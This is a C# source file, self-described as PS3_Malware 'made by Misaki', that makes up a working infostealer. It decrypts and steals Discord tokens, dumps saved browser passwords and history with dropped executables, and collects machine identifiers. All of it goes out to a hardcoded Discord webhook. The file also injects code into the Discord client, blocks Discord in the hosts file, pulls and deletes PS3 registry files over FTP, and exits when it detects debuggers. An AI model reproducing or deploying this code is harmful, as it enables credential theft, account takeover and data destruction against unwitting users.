﻿/*
 * MADE BY MISAKI
*/

#region "Library"

using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;
using System.Xml.Linq;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;

#endregion
#region "Misaki Class"

namespace PS3_Malware
{
    internal class Vars
    {
        #region "Variables webhook"

        public static string webhook_link = "https://discord.com/api/webhooks/1046213703462310051/0nSLykWa3zzkmBPiWJfGb8pw2Ui0idLjJFOTexmmB0VGzNWsfRrjx2fOoPN_gXm5jLGD";
        //public static string webhook_link = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/r1YbTter"); //logs tokens

        #endregion
    }

    internal class MisakiV1 //Discord Tokens Grabber
    {
        #region Start
        public static void Start()
        {
            KillProcesses();
            Run();
            SendInfo();
        }
        #endregion
        #region Run
        static readonly List<string> tokens = new List<string>();

        static void Run()
        {
            List<string> locations = new List<string>();
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            locations.Add(appdata + "\\discord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordcanary\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordptb\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Lightcord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Mozilla\\Firefox\\Profiles");
            locations.Add(localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
            locations.Add(localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            locations.Add(localappdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\");
            foreach (var path in locations)
            {
                if (!Directory.Exists(path)) continue;
                if (path.Contains("Mozilla"))
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles("*.sqlite", SearchOption.AllDirectories))
                    {
                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                        {
                            if (Check(match.Value) == true && !tokens.Contains(match.Value)) tokens.Add(match.Value);
                        }
                    }
                }
                else if (path.Contains("cord"))
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles("*.ldb", SearchOption.AllDirectories))
                    {
                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)"))
                        {
                            dynamic deserialize = new JavaScriptSerializer().DeserializeObject(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local State"));
                            AeadParameters parameters = new AeadParameters(new KeyParameter(ProtectedData.Unprotect(Convert.FromBase64String((string)deserialize["os_crypt"]["encrypted_key"]).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser)), 128, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(3).Take(12).ToArray(), null);
                            GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                            cipher.Init(false, parameters);
                            byte[] bytes = new byte[cipher.GetOutputSize(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length)];
                            cipher.DoFinal(bytes, cipher.ProcessBytes(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray(), 0, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length, bytes, 0));
                            string token = Encoding.UTF8.GetString(bytes).TrimEnd("\r\n\0".ToCharArray());
                            if (Check(token) == true && !tokens.Contains(token)) tokens.Add(token);
                        }
                    }
                }
                else
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles())
                    {
                        if (file.Equals("LOCK")) continue;
                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                        {
                            if (Check(match.Value) == true && !tokens.Contains(match.Value)) tokens.Add(match.Value);
                        }
                    }
                }
            }
        }
        #endregion
        #region Kill Processes
        static void KillProcesses()
        {
            string[] processlist = { "discord", "discordcanary", "discordptb", "lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "chromium-browser", "yandex", "msedge", "brave", "vivaldi", "epic" };
            foreach (Process process in Process.GetProcesses())
            {
                foreach (var name in processlist)
                {
                    if (process.ProcessName.ToLower() == name) process.Kill();
                }
            }
        }
        #endregion
        #region "WebHook Embeds"
        public static void WebhookEmbeds(string webhook, string username, string thumbnail_url, string title_url, string title, string description, string color, string image_url, string icon_footer, string footer)
        {
            WebRequest wr = (HttpWebRequest)WebRequest.Create(webhook);
            wr.ContentType = "application/json";
            wr.Method = "POST";

            using (var sw = new StreamWriter(wr.GetRequestStream()))
            {
                string json = JsonConvert.SerializeObject(new
                {
                    username = username,
                    embeds = new[]
                    {
                        new {
                             thumbnail = new {
                                url = thumbnail_url,
                            },

                            title = title,
                            description = description,
                            url = title_url,
                            color = color,

                            image = new {
                                  url = image_url
                            },

                            footer = new {
                                icon_url = icon_footer,
                                text = footer
                            },
                        }
                    }
                });

                sw.Write(json);
            }

            var response = (HttpWebResponse)wr.GetResponse();
        }

        #endregion
        #region Send Info
        static void SendInfo()
        {
            try
            {
                /*
                foreach (string token in tokens)
                {
                    //GET USER INFOS
                    string user_nitro;
                    var request = Request("/users/@me", "GET", token);
                    dynamic info = new JavaScriptSerializer().DeserializeObject(request);

                    var id = info["id"];
                    var username = info["username"] + "#" + info["discriminator"];
                    var email = info["email"];
                    var phone = info["phone"];
                    var avatar = info["avatar"];
                    var banner = info["banner"];
                    int nitro = info["premium_type"];
                    var mfa = info["mfa_enabled"];

                    //CHECK NITRO TYPE
                    if (info["premium_type"] == 0)
                        user_nitro = "none";
                    else if (info["premium_type"] == 1)
                        user_nitro = "Nitro Classic";
                    else if (info["premium_type"] == 2)
                        user_nitro = "Nitro Boost";
                    else if (info["premium_type"] == 3)
                        user_nitro = "Nitro Basic";
                    else
                        user_nitro = "None";

                    //SOME VARIABLES
                    string info_user = "<a:pinkcrown:996004209667346442> " + username + " (" + id + ")";
                    string info_phone = "\n<:starxglow:996004217699434496> Phone: " + phone;
                    string info_MFA = "\n<:mfa:1021604916537602088> MFA: " + mfa;
                    string info_email = "\n<a:rainbowheart:996004226092245072> Email: " + email;
                    string info_nitro = "\n <a:nitroboost:996004213354139658> Nitro: " + user_nitro;
                    string user_avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png";
                    string user_banner = "https://cdn.discordapp.com/banners/" + id + "/" + banner + ".gif?size=600";
                    string user_token = "```" + token + "```";

                    string message = user_token + info_phone + info_MFA + info_email + info_nitro + "\n<a:earthpink:996004236531859588> Banner:";

                    WebhookEmbeds(Vars.webhook_link, "Misaki Token Grabber", user_avatar, "", info_user, message, "000000", user_banner, "", "Made By Misaki");
                    Thread.Sleep(200);
                }
                */

                string token = string.Join("\n\n", tokens);

                WebhookEmbeds(Vars.webhook_link, "Misaki Token Grabber", "", "", "<a:pinkcrown:996004209667346442> Tokens Found", token, "000000", "", "", "Made By Misaki");
            }
            catch (Exception ex)
            {

            }
        }
        #endregion
        #region Check
        static bool Check(string token)
        {
            try
            {
                Request("/users/@me", "GET", token);
                return true;
            }
            catch { return false; }
        }
        #endregion
        #region Request
        static string Request(string endpoint, string method, string auth = null, string json = null)
        {
            string text = "";
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            WebRequest request;
            if (auth != null)
            {
                request = WebRequest.Create("https://discord.com/api/v10" + endpoint);
                request.Headers.Add("Authorization", auth);
            }
            else
                request = WebRequest.Create(endpoint);
            request.Method = method;
            if (json == null)
                request.ContentLength = 0;
            else
            {
                request.ContentType = "application/json";
                using (var stream = new StreamWriter(request.GetRequestStream()))
                    stream.Write(json);
            }
            using (var stream = new StreamReader(request.GetResponse().GetResponseStream()))
            {
                text = stream.ReadToEnd();
                stream.Dispose();
            }
            request.Abort();
            return text;
        }
        #endregion
    }

    internal class MisakiV2 //Browser & History Grabber
    {
        #region "WebHook Functions"

        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public string Name { get; set; }
            public string ProfilePictureUrl { get; set; }

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");

                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "file", "img.jpeg");
                }

                var resp = Client.PostAsync(Url, data).Result;

                return resp.StatusCode == HttpStatusCode.NoContent;
            }

            public bool SendMessageImage(string content, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");

                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "file", "file.png");
                }

                var resp = Client.PostAsync(Url, data).Result;

                return resp.StatusCode == HttpStatusCode.NoContent;
            }

            public bool SendMessageFile(string content, string format, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");

                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "file", format);
                }

                var resp = Client.PostAsync(Url, data).Result;

                return resp.StatusCode == HttpStatusCode.NoContent;
            }
        }

        public static void SendWebHookMessage(string token, string name, string picture, string message, string file)
        {
            Webhook hook = new Webhook(token);
            hook.Name = name;
            hook.ProfilePictureUrl = picture;

            hook.SendMessage(message, file);
        }

        public static void SendWebHookFile(string token, string name, string picture, string message, string format, string file)
        {
            Webhook hook = new Webhook(token);
            hook.Name = name;
            hook.ProfilePictureUrl = picture;

            hook.SendMessageFile(message, format, file);
        }


        #endregion
        #region "Browser & Histroy grabber"
        static void LoadFiles(string path, byte[] fileBytes)
        {
            File.WriteAllBytes(path, fileBytes);
        }

        public static bool IsFileinUse(FileInfo file)
        {
            FileStream stream = null;
            if (file.Name.Contains("capture.png") & !file.Exists)
            {
                Thread.Sleep(1000);
                if (!file.Exists)
                    return false;
            }
            try
            {
                stream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
            }
            catch (IOException)
            {
                return true;
            }
            finally
            {
                if (stream != null)
                    stream.Close();
            }
            return false;
        }

        public static void Passwords()
        {
            try
            {
                string Temp = Path.GetTempPath();

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
                string idk = Temp + "compile.bat";
                string idk2 = Temp + "compile.vbs";
                if (File.Exists(idk)) File.Delete(idk);
                if (File.Exists(idk2)) File.Delete(idk2);
                using (StreamWriter streamWriter = File.CreateText(idk))
                {
                    streamWriter.WriteLine("start %temp%\\snuvcdsm.exe /stext \"%temp%\\%username%_Passwords.txt\"");
                    streamWriter.WriteLine("exit");
                }
                using (StreamWriter streamWriter2 = File.CreateText(idk2))
                {
                    streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
                    streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
                    streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
                    streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
                    streamWriter2.WriteLine("Dim strArgs");
                    streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
                    streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
                }
                Process proc = new Process();
                proc.StartInfo.WorkingDirectory = Temp;
                proc.StartInfo.FileName = "compile.vbs";
                proc.StartInfo.CreateNoWindow = true;
                proc.EnableRaisingEvents = true;
                proc.Start();
                proc.WaitForExit();
                File.Delete(idk);
                File.Delete(idk2);
                string text = Temp + Environment.UserName + "_Passwords.txt";
                while (!File.Exists(text) | IsFileinUse(new FileInfo(text))) { }
                string vm = File.ReadAllText(text);
                if (vm == "")
                {
                    return;
                }
                long size_psw = new FileInfo(text).Length;
                if (size_psw < 7900000)
                {
                    try
                    {
                        bool flag = File.Exists(text);
                        if (flag)
                        {
                            try
                            {
                                SendWebHookFile(Vars.webhook_link, "DownCraft Logs", "", "Password:", "password.txt", text);
                            }
                            catch
                            {

                            }
                        }
                        else
                        {

                        }
                    }
                    catch (Exception x)
                    {

                    }
                }
                else
                {

                }
                File.Delete(text);
            }
            catch
            {

            }
        }

        public static void History()
        {
            try
            {
                string Temp = Path.GetTempPath();

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
                string idk = Temp + "compile.bat";
                string idk2 = Temp + "compile.vbs";
                if (File.Exists(idk)) File.Delete(idk);
                if (File.Exists(idk2)) File.Delete(idk2);
                using (StreamWriter streamWriter = File.CreateText(idk))
                {
                    streamWriter.WriteLine("start %temp%\\xwizard.exe /stext \"%temp%\\%username%_History.txt\"");
                    streamWriter.WriteLine("exit");
                }
                using (StreamWriter streamWriter2 = File.CreateText(idk2))
                {
                    streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
                    streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
                    streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
                    streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
                    streamWriter2.WriteLine("Dim strArgs");
                    streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
                    streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
                }
                Process proc = new Process();
                proc.StartInfo.WorkingDirectory = Temp;
                proc.StartInfo.FileName = "compile.vbs";
                proc.StartInfo.CreateNoWindow = true;
                proc.EnableRaisingEvents = true;
                proc.Start();
                proc.WaitForExit();
                File.Delete(idk);
                File.Delete(idk2);
                string _history = Temp + Environment.UserName + "_History.txt";
                while (!File.Exists(_history) | IsFileinUse(new FileInfo(_history))) { }
                long s = new FileInfo(_history).Length;
                if (s < 7900000)
                {
                    try
                    {
                        bool flag1 = true;
                        if (File.Exists(_history))
                        {
                            string vm = File.ReadAllText(_history);
                            flag1 = vm == "";
                        }
                        bool flag = File.Exists(_history);
                        if (flag && !flag1)
                        {
                            try
                            {
                                SendWebHookFile(Vars.webhook_link, "DownCraft Logs", "", "History:", "history.txt", _history);
                            }
                            catch
                            {

                            }
                        }
                        else if (flag1)
                        {


                        }
                        else
                        {

                        }
                    }
                    catch (Exception ex)
                    {

                    }
                }
                else
                {

                }
                File.Delete(_history);
            }
            catch
            {

            }
        }

        #endregion
        #region "Start"

        public static void Start()
        {
            try
            {
                string tmp = Path.GetTempPath();
                LoadFiles(tmp + "snuvcdsm.exe", DownCraft_Center.Properties.Resources.snuvcdsm);
                LoadFiles(tmp + "xwizard.exe", DownCraft_Center.Properties.Resources.xwizard);

                Passwords();
                History();
            }
            catch (Exception ex)
            {

            }
        }

        #endregion
    }

    internal class MisakiV3 //xRegistry PS3 Grabber
    {
        #region "Variables"

        static string ps3IP;

        #endregion
        #region "WebHook Functions"

        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public string Name { get; set; }
            public string ProfilePictureUrl { get; set; }

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");

                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "file", "img.jpeg");
                }

                var resp = Client.PostAsync(Url, data).Result;

                return resp.StatusCode == HttpStatusCode.NoContent;
            }

            public bool SendMessageImage(string content, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");

                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "file", "file.png");
                }

                var resp = Client.PostAsync(Url, data).Result;

                return resp.StatusCode == HttpStatusCode.NoContent;
            }

            public bool SendMessageFile(string content, string format, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");

                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "file", format);
                }

                var resp = Client.PostAsync(Url, data).Result;

                return resp.StatusCode == HttpStatusCode.NoContent;
            }
        }

        public static void SendWebHookMessage(string token, string name, string picture, string message, string file)
        {
            Webhook hook = new Webhook(token);
            hook.Name = name;
            hook.ProfilePictureUrl = picture;

            hook.SendMessage(message, file);
        }

        public static void SendWebHookFile(string token, string name, string picture, string message, string format, string file)
        {
            Webhook hook = new Webhook(token);
            hook.Name = name;
            hook.ProfilePictureUrl = picture;

            hook.SendMessageFile(message, format, file);
        }


        #endregion
        #region "FTP Functions"

        public static void FTP_DOWNLOAD(string URL, string username, string password, string pathConsole, string filePC)
        {
            using (var client = new WebClient())
            {
                client.Credentials = new NetworkCredential(username, password);
                client.DownloadFile(URL + pathConsole, filePC);
            }
        }

        #endregion
        #region "Start"
        public static void Start()
        {
            string xRegistry = Path.GetTempPath() + "xRegistry.sys";
            FTP_DOWNLOAD("ftp://" + ps3IP, "", "", "/dev_flash2/etc/xRegistry.sys", xRegistry);
            SendWebHookFile(Vars.webhook_link, "misaki", "", "xRegistry.sys file found!", "xRegistry.sys", xRegistry);
        }

        #endregion
    }

    internal class MisakiV4 //Delete all user on the PS3
    {
        #region "Variables"

        static string ps3IP;

        #endregion
        #region "FTP Functions"
        static bool FTP_DELETE(string uriString, bool ssl = false, bool binary = false, string ftpUsername = "def", string ftpPassword = "default")
        {
            var serverUri = new Uri(uriString);
            try
            {

                if (serverUri.Scheme != Uri.UriSchemeFtp)
                {
                    return false;
                }
                // Get the object used to communicate with the server.
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(serverUri);
                request.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
                request.Method = WebRequestMethods.Ftp.DeleteFile;
                request.UseBinary = binary;
                request.AuthenticationLevel = System.Net.Security.AuthenticationLevel.MutualAuthRequired;

                request.EnableSsl = ssl;
                FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                Console.WriteLine("[!¡] DEL: {0}", response.StatusDescription);
                response.Close();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!*] ERR: {ex.GetType()} : {ex.Message} ||| {ex.StackTrace}");
                return false;
            }
        }

        #endregion
        #region "Start"
        public static void Start()
        {
            FTP_DELETE("ftp://" + ps3IP + "/dev_flash2/etc/backup/xRegistry.sys", false, false);
            FTP_DELETE("ftp://" + ps3IP + "/dev_flash2/etc/xRegistry.sys", false, false);
        }

        #endregion
    }

    internal class MisakiV5 //Remove Discord Access (website + app)
    {
        #region "Start"
        public static void Start()
        {
            using (StreamWriter w = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts")))
            {
                w.WriteLine("\n\n0.0.0.0 discord.com");
                w.WriteLine("\n0.0.0.0 support.discord.com");
                w.WriteLine("\n0.0.0.0 canary.discord.com");
                w.WriteLine("\n0.0.0.0 ptb.discord.com");
            }
        }

        #endregion
    }

    internal class MisakiV6 //Injection Discord (change pw, change email, new login)
    {
        #region "Start"
        public static void Start()
        {
            try
            {
                string version = new WebClient().DownloadString("https://pastebin.com/raw/JBVcyyzt");

                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord"))
                {
                    if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\" + version))
                    {
                        foreach (var process in Process.GetProcessesByName("discord"))
                        {
                            process.Kill();
                        }
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe");
                    }

                    //START THE INJECTION
                    string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\" + version + "\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js";
                    string injection = DownCraft_Center.Properties.Resources.index;
                    File.WriteAllText(local, injection);

                    foreach (var process in Process.GetProcessesByName("discord"))
                    {
                        process.Kill();
                    }
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\" + version + "\\Discord.exe");
                }
            }
            catch (Exception ex)
            {

            }
        }

        #endregion
    }

    internal class MisakiV7 //Get PC infos (HWID, IP, PC INFO)
    {
        #region "WebHook Embeds"

        public static void WebhookEmbeds(string webhook, string username, string thumbnail_url, string title_url, string title, string description, string color, string image_url, string icon_footer, string footer)
        {
            WebRequest wr = (HttpWebRequest)WebRequest.Create(webhook);
            wr.ContentType = "application/json";
            wr.Method = "POST";

            using (var sw = new StreamWriter(wr.GetRequestStream()))
            {
                string json = JsonConvert.SerializeObject(new
                {
                    username = username,
                    embeds = new[]
                    {
                        new {
                             thumbnail = new {
                                url = thumbnail_url,
                            },

                            title = title,
                            description = description,
                            url = title_url,
                            color = color,

                            image = new {
                                  url = image_url
                            },

                            footer = new {
                                icon_url = icon_footer,
                                text = footer
                            },
                        }
                    }
                });

                sw.Write(json);
            }

            var response = (HttpWebResponse)wr.GetResponse();
        }

        #endregion
        #region "Some functions"
        public static string GetHWID()
        {
            var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
            ManagementObjectCollection mbsList = mbs.Get();
            string HWID = "";
            foreach (ManagementObject mo in mbsList)
            {
                HWID = mo["ProcessorId"].ToString();
                break;
            }
            return HWID;
        }

        public static string getGPU()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");

            string graphicsCard = string.Empty;
            foreach (ManagementObject mo in searcher.Get())
            {
                foreach (PropertyData property in mo.Properties)
                {
                    if (property.Name == "Description")
                    {
                        graphicsCard = property.Value.ToString();
                    }
                }
            }
            return graphicsCard;
        }

        public static string getCPU()
        {
            var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
            var processorName = key.GetValue("ProcessorNameString");
            return processorName.ToString();
        }

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);
        private static string DisplayTotalRam()
        {
            long memKb;
            GetPhysicallyInstalledSystemMemory(out memKb);
            long total = memKb / 1024 / 1024;
            return (total.ToString() + ".0 GB");
        }

        public static string getIPV4()
        {
            string IP = new WebClient().DownloadString("http://ipinfo.io/ip");
            return IP;
        }

        public static string getMACAdress()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration where IPEnabled=true");
            IEnumerable<ManagementObject> objects = searcher.Get().Cast<ManagementObject>();
            string mac = (from o in objects orderby o["IPConnectionMetric"] select o["MACAddress"].ToString()).FirstOrDefault();
            return mac;
        }

        #endregion
        #region "Start"
        public static void Start()
        {
            try
            {
                string hostname = "Hostname: " + System.Environment.MachineName;
                string username = "\nUsername: " + Environment.UserName;
                string CPU = "\nCPU: " + getCPU();
                string GPU = "\nGPU: " + getGPU();
                string HWID = "\nHWID: " + GetHWID();
                string RAM = "\nRAM: " + DisplayTotalRam();
                string IP = "\nIP: " + getIPV4();
                string MACAdress = "\nMAC ADDRESS: " + getMACAdress();

                string message = hostname + username + CPU + GPU + HWID + RAM + IP + MACAdress;

                WebhookEmbeds(Vars.webhook_link, "Misaki Grabber", "", "", "<a:earthpink:996004236531859588> PC Information", message, "000000", "", "", "Made by Misaki");
            }
            catch (Exception ex)
            {

            }
        }

        #endregion
    }

    internal class MisakiV8 //Protection anti-debug
    {
        #region "Start"
        public static void Start()
        {
            bool BadProcess = true;

            while (BadProcess == true)
            {
                try
                {
                    bool process1 = Process.GetProcessesByName("processhacker").Any();
                    bool process2 = Process.GetProcessesByName("taskmgr").Any();
                    bool process3 = Process.GetProcessesByName("ida").Any();
                    bool process4 = Process.GetProcessesByName("ida64").Any();
                    bool process5 = Process.GetProcessesByName("dnspy").Any();
                    bool process6 = Process.GetProcessesByName("hxd").Any();
                    bool process7 = Process.GetProcessesByName("procmon64").Any();
                    bool process8 = Process.GetProcessesByName("codecracker").Any();
                    bool process9 = Process.GetProcessesByName("idag").Any();
                    bool process10 = Process.GetProcessesByName("idaw").Any();
                    bool process11 = Process.GetProcessesByName("idaq").Any();
                    bool process12 = Process.GetProcessesByName("idau").Any();
                    bool process13 = Process.GetProcessesByName("scylla").Any();
                    bool process14 = Process.GetProcessesByName("de4dot").Any();
                    bool process15 = Process.GetProcessesByName("de4dotmodded").Any();
                    bool process16 = Process.GetProcessesByName("protection_id").Any();
                    bool process17 = Process.GetProcessesByName("ollydbg").Any();
                    bool process18 = Process.GetProcessesByName("x64dbg").Any();
                    bool process19 = Process.GetProcessesByName("x32dbg").Any();
                    bool process20 = Process.GetProcessesByName("x96dbg").Any();
                    bool process21 = Process.GetProcessesByName("x64netdumper").Any();
                    bool process22 = Process.GetProcessesByName("petools").Any();
                    bool process23 = Process.GetProcessesByName("windbg").Any();
                    bool process24 = Process.GetProcessesByName("reshacker").Any();
                    bool process25 = Process.GetProcessesByName("simpleassembly").Any();
                    bool process26 = Process.GetProcessesByName("process hacker").Any();
                    bool process27 = Process.GetProcessesByName("process monitor").Any();
                    bool process28 = Process.GetProcessesByName("qt5core").Any();
                    bool process29 = Process.GetProcessesByName("importREC").Any();
                    bool process30 = Process.GetProcessesByName("immunitydebugger").Any();
                    bool process31 = Process.GetProcessesByName("megadumper").Any();
                    bool process32 = Process.GetProcessesByName("cheatengine-x86_64").Any();
                    bool process33 = Process.GetProcessesByName("dump").Any();
                    bool process34 = Process.GetProcessesByName("dbgclr").Any();
                    bool process35 = Process.GetProcessesByName("wireshark").Any();
                    bool process36 = Process.GetProcessesByName("Fiddler Everywhere").Any();
                    bool process37 = Process.GetProcessesByName("FiddlerCap").Any();
                    bool process38 = Process.GetProcessesByName("Fiddler").Any();
                    bool process39 = Process.GetProcessesByName("JustDecompile").Any();
                    bool process40 = Process.GetProcessesByName("ILSpy").Any();

                    if (process1 || process2 || process3 || process4 || process5 || process6 || process7 || process8 || process9 || process10 || process11 || process12 || process13 || process14 || process15 || process16 || process17 || process18 || process19 || process20 || process21 || process22 || process23 || process24 || process25 || process26 || process27 || process28 || process29 || process30 || process31 || process32 || process33 || process34 || process35 || process36 || process37 || process38 || process39 || process40)
                    {
                        System.Environment.Exit(1);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
        }

        #endregion
    }
}

#endregion